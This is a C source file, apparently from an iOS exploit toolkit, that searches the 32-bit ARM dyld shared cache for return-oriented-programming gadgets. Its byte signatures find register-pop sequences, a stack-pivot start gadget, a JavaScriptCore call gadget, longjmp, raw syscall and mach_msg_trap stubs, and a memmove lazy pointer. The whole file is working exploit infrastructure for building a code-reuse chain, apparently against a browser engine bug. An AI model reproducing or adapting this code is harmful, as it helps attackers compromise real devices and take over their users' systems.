#include "dyld_cache.h"
#include "util.h"
#include "procyon.h"
#include "gadget_finder.h"

static const char *common_images[] = {
    "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics",
    "/System/Library/PrivateFrameworks/CorePDF.framework/CorePDF",
    "/System/Library/PrivateFrameworks/CoreThemeDefinition.framework/CoreThemeDefinition",
    "/System/Library/Frameworks/AudioToolbox.framework/AudioCodecs",
    "/System/Library/Frameworks/ImageIO.framework/ImageIO",
    "/System/Library/PrivateFrameworks/WebCore.framework/WebCore",
    "/System/Library/Frameworks/AVFoundation.framework/AVFoundation",
    "/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
    "/usr/lib/libicucore.A.dylib",
    "/usr/lib/libSystem.B.dylib",
    "/usr/lib/system/libsystem_trace.dylib",
    "/usr/lib/libc++.1.dylib",
    "/usr/lib/system/libsystem_kernel.dylib",
    "/usr/lib/system/libdispatch.dylib",
    "/usr/lib/libobjc.A.dylib",
    "/usr/lib/system/libsystem_c.dylib",
    "/usr/lib/libLLVM.dylib",
    "/usr/lib/libGLProgrammability.dylib",
    "/usr/lib/libCommCenterBase.dylib",
    "/usr/lib/libmecab_em.dylib",
    "/System/Library/PrivateFrameworks/MusicLibrary.framework/MusicLibrary",
    "/System/Library/PrivateFrameworks/Swift/lib/libswiftCore.dylib",
    NULL
};

static uint8_t *bh_memmem(const uint8_t *haystack, size_t hlen, const uint8_t *needle, size_t nlen) {
    size_t last, scan = 0;
    size_t skip[256];
    
    if (nlen <= 0 || !haystack || !needle) return NULL;
    for (scan = 0; scan <= 255; scan = scan + 1) skip[scan] = nlen;

    last = nlen - 1;
    for (scan = 0; scan < last; scan = scan + 1) skip[needle[scan]] = last - scan;

    while (hlen >= nlen) {
        for (scan = last; haystack[scan] == needle[scan]; scan = scan - 1)
            if (scan == 0) return (void *)haystack;

        hlen -= skip[haystack[last]];
        haystack += skip[haystack[last]];
    }
    return NULL;
}

uint32_t find_bytes_in_image(const char *name, uint8_t *target, size_t size, bool thumb) {
    dsc_image_t *image = NULL;
    for (uint32_t i = 0; i < procyon->dsc.info->image_count; i++) {
        if (strstr(procyon->dsc.info->images[i].path, name) != NULL) {
            image = &procyon->dsc.info->images[i];
            break;
        }
    }

    if (image == NULL) return 0;
    uint8_t *data = (uint8_t *)image->exec_local_addr;
    size_t data_size = (size_t)image->exec_size;
    if (data == NULL || data_size == 0) return 0;

    uint8_t *loc = bh_memmem(data, data_size, target, size);
    if (loc == NULL) return 0;

    uint32_t addr = image->exec_virt_addr + ((uintptr_t)loc - (uintptr_t)data);
    if ((thumb && ((addr & 0xf) % 2) != 0) || (!thumb && ((addr & 0xf) % 4) != 0)) return 0;
    if (addr <= procyon->dsc.region_base || addr >= (procyon->dsc.region_base + procyon->dsc.region_size) || (addr & 0xff000000) == 0) return 0;
    return addr | (thumb ? 1 : 0);
}

uint32_t find_bytes(uint8_t *target, size_t size, bool thumb) {
    uint8_t *data = NULL;
    uint8_t *loc = NULL;
    size_t data_size = 0;

    for (uint32_t i = 0; common_images[i] != NULL; i++) {
        uint32_t addr = find_bytes_in_image(common_images[i], target, size, thumb);
        if (addr != 0) return addr;
    }
    
    for (uint32_t i = 0; i < procyon->dsc.info->image_count; i++) {
        data = (uint8_t *)procyon->dsc.info->images[i].exec_local_addr;
        data_size = (size_t)procyon->dsc.info->images[i].exec_size;
        if (data == NULL || data_size == 0) continue;

        if ((loc = bh_memmem(data, data_size, target, size)) == NULL) continue;
        uint32_t addr = procyon->dsc.info->images[i].exec_virt_addr + ((uintptr_t)loc - (uintptr_t)data);
        
        if ((thumb && ((addr & 0xf) % 2) != 0) || (!thumb && ((addr & 0xf) % 4) != 0)) {
            addr = 0;
            continue;
        }
        
        if (addr <= procyon->dsc.region_base || addr >= (procyon->dsc.region_base + procyon->dsc.region_size) || (addr & 0xf0000000) == 0) {
            addr = 0;
            continue;
        }
        return addr | (thumb ? 1 : 0);
    } 
    return 0;
}

uint32_t find_pop_r4_r7_pc(void) {
    uint8_t target[] = { 0x90, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r0_r1_r2_r3_r4_pc(void) {
    uint8_t target[] = { 0x1F, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r4_r5_r6_r7_pc(void) {
    uint8_t target[] = { 0xF0, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_ldr_r1_r2_4_bx_lr(void) {
    uint8_t target[] = { 0x51, 0x68, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_ldr_r12_sp_mov_pc_r2(void) {
    uint8_t target[] = { 0xDD, 0xF8, 0x00, 0xC0, 0xDD, 0xF8, 0x28, 0x80, 0x97, 0x46 };
    uint8_t target_alt[] = { 0xDD, 0xF8, 0x00, 0xC0, 0xDD, 0xF8, 0x68, 0xA0, 0x97, 0x46 };

    uint32_t addr = find_bytes(target, sizeof(target), true);
    if (addr != 0) return addr;
    return find_bytes(target_alt, sizeof(target_alt), true);
}

uint32_t find_svc_0x80_bx_lr(void) {
    uint8_t target[] = { 0x80, 0x00, 0x00, 0xEF, 0x1E, 0xFF, 0x2F, 0xE1 };
    return find_bytes(target, sizeof(target), false);
}

uint32_t find_str_r0_r3_bx_lr(void) {
    uint8_t target[] = { 0x18, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r2_r3_r7_pc(void) {
    uint8_t target[] = { 0x8C, 0xBD };
    return find_bytes_in_image("/System/Library/Frameworks/AVFoundation.framework/AVFoundation", target, sizeof(target), true);
}

uint32_t find_ldr_r0_r2_bx_lr(void) {
    uint8_t target[] = { 0x10, 0x68, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_add_r0_r2_bx_lr(void) {
    uint8_t target[] = { 0x10, 0x44, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_str_r0_r2_bx_lr(void) {
    uint8_t target[] = { 0x10, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_str_r2_r3_bx_lr(void) {
    uint8_t target[] = { 0x1A, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_add_r0_r1_bx_lr(void) {
    uint8_t target[] = { 0x08, 0x44, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r0_r1_pc(void) {
    uint8_t target[] = { 0x03, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_str_r0_r1_bx_lr(void) {
    uint8_t target[] = { 0x08, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r12_pc(void) {
    uint8_t target_t32[] = { 0xBD, 0xE8, 0x00, 0x90 };
    uint32_t addr = find_bytes(target_t32, sizeof(target_t32), true);
    if (addr != 0) return addr;
    
    uint8_t target_a32[] = { 0x00, 0x90, 0xBD, 0xE8 };
    return find_bytes(target_a32, sizeof(target_a32), false);
}

uint32_t find_pop_lr_pc(void) {
    uint8_t target[] = { 0x00, 0xC0, 0xBD, 0xE8 };
    return find_bytes(target, sizeof(target), false);
}

uint32_t find_ldm_r1_r3_r5_r10_r11_r12_lr_pc(void) {
    uint8_t target[] = { 0x28, 0xDC, 0xB1, 0xE8 };
    return find_bytes(target, sizeof(target), false);
}

uint32_t find_ldm_r5_r0_r2_r4_r5_r8_r11_r12_pc(void) {
    uint8_t target[] = { 0x35, 0x99, 0x95, 0xE8 };
    return find_bytes(target, sizeof(target), false);
}

uint32_t find_ldm_r3_r1_r3_r9_r10_pc(void) {
    uint8_t target[] = { 0x0A, 0x86, 0xB3, 0xE8 };
    return find_bytes(target, sizeof(target), false);
}

uint32_t find_js_proto_lr(void) {
    uint8_t target_r12[] = { 
        0xD1, 0xF8, // ldr.w r12, [r1, #0x24] (T32s)
        0x24, 0xC0, // ...
        0xE0, 0x47, // blx r12 (T16)
        0x3C, 0x69  // ldr r4, [r7, #0x10] (T16)
    };

    uint8_t target_r10[] = { 
        0xD1, 0xF8, // ldr.w r10, [r1, #0x24] (T32s)
        0x24, 0xA0, // ...
        0xD0, 0x47, // blx r10 (T16)
        0x3C, 0x69  // ldr r4, [r7, #0x10] (T16)
    };

    uint8_t target_r8[] = { 
        0xD1, 0xF8, // ldr.w r8, [r1, #0x24] (T32s)
        0x24, 0x80, // ...
        0xC0, 0x47, // blx r8 (T16)
        0x3C, 0x69  // ldr r4, [r7, #0x10] (T16)
    };

    uint32_t addr = find_bytes_in_image("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", target_r12, sizeof(target_r12), true);
    if (addr != 0) return addr + 0x6;

    addr = find_bytes_in_image("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", target_r10, sizeof(target_r10), true);
    if (addr != 0) return addr + 0x6;

    addr = find_bytes_in_image("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", target_r8, sizeof(target_r8), true);
    if (addr != 0) return addr + 0x6;
    return 0;
}

uint32_t find_rop_start(void) {
    uint8_t target[] = { 
        0x48, 0x68, // ldr r0, [r1, #4]
        0x03, 0x68, // ldr r3, [r0]
        0x1B, 0x69, // ldr r3, [r3, #0x10]
        0x18, 0x47  // bx r3
    };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_longjmp(void) {
    uint8_t target[] = { 
        0xF0, 0x6D, 0xB0, 0xE8, // ldm r0!, {r4-r8,r10,r11,sp,lr}
        0x10, 0x8B, 0x90, 0xEC, // vldm r0, {d8-d15}
        0x01, 0x00, 0xB0, 0xE1, // movs r0, r1
        0x01, 0x00, 0xA0, 0x03, // moveq r0, #1
        0x1E, 0xFF, 0x2F, 0xE1  // bx lr
    };
    return find_bytes_in_image("libsystem_platform.dylib", target, sizeof(target), false);
}

uint32_t find_syscall(void) {
    uint8_t target[] = { 
        0x0D, 0xC0, 0xA0, 0xE1, // mov r12, sp
        0x70, 0x01, 0x2D, 0xE9, // push {r4-r6,r8}
        0x70, 0x00, 0x9C, 0xE8, // ldm r12, {r4-r6}
        0x00, 0xC0, 0xA0, 0xE3, // mov r12, #0
        0x80, 0x00, 0x00, 0xEF  // svc #0x80
    };
    return find_bytes_in_image("libsystem_kernel.dylib", target, sizeof(target), false);
}

uint32_t find_mach_msg_trap(void) {
    uint8_t target[] = { 
        0x0D, 0xC0, 0xA0, 0xE1, // mov r12, sp
        0x70, 0x01, 0x2D, 0xE9, // push {r4-r6, r8}
        0x70, 0x00, 0x9C, 0xE8, // ldm r12, {r4-r6}
        0x1E, 0xC0, 0xE0, 0xE3, // mov r12, #0xFFFFFFE1
        0x80, 0x00, 0x00, 0xEF, // svc #0x80
        0x70, 0x01, 0xBD, 0xE8, // pop {r4-r6,r8}
        0x1E, 0xFF, 0x2F, 0xE1  // bx lr
    };

    uint32_t addr = find_bytes_in_image("libsystem_kernel.dylib", target, sizeof(target), false);
    if (addr == 0) return 0;
    return addr + 0x4;
}

uint32_t find_platform_memmove(void) {
    uint8_t target[] = { 
        0x80, 0xB5, // push {r7,lr}
        0x6F, 0x46, // mov r7, sp
        0x43, 0x1A  // subs r3, r0, r1
    };
    return find_bytes_in_image("libsystem_platform.dylib", target, sizeof(target), true);
}

uint32_t find_platform_memmove_lazy_ptr(void) {
    uint32_t target = find_platform_memmove();
    if (target == 0) return 0;

    dsc_image_t *image = NULL;
    for (uint32_t i = 0; i < procyon->dsc.info->image_count; i++) {
        if (strstr(procyon->dsc.info->images[i].path, "libsystem_c.dylib") != NULL) {
            image = &procyon->dsc.info->images[i];
            break;
        }
    }

    struct mach_header *mach_hdr = (struct mach_header *)image->local_addr;
    uint32_t virt_addr = 0;
    uintptr_t local_addr = 0;
    uint32_t size;

    struct load_command *load_cmd = (struct load_command *)(mach_hdr + 1);
    for (uint32_t j = 0; j < mach_hdr->ncmds; j++) {
        if (load_cmd->cmd == LC_SEGMENT) {
            struct segment_command *segment = (struct segment_command *)load_cmd;

            if (segment->vmaddr != 0 && segment->vmsize != 0) {
                if (strcmp(segment->segname, "__DATA_CONST") == 0) {
                    struct section *section = (struct section *)(segment + 1);

                    for (uint32_t l = 0; l < segment->nsects; l++) {
                        if (strcmp(section[l].sectname, "__la_symbol_ptr") == 0) {
                            virt_addr = section[l].addr;
                            local_addr = (uintptr_t)procyon->dsc.info->hdr + section[l].offset;
                            size = section[l].size;
                            break;
                        }
                    }
                }
            }
        }

        if (virt_addr != 0) break;
        load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
    }

    if (virt_addr == 0 || size == 0) return 0;
    uint32_t count = 0;

    for (uint32_t i = 0; i < size; i+=4) {
        uint32_t value = (*(uint32_t *)(local_addr + i)) & 0x00ffffff;
        if (value == (target & 0x00ffffff)) {
            if (count == 1) return virt_addr + i;
            count++;
        }
    }

    count = 0;
    for (uint32_t i = 0; i < size; i+=4) {
        uint32_t value = (*(uint32_t *)(local_addr + i)) & 0x00000fff;
        if (value == (target & 0x00000fff)) {
            if (count == 1) return virt_addr + i;
            count++;
        }
    }
    return 0;
}
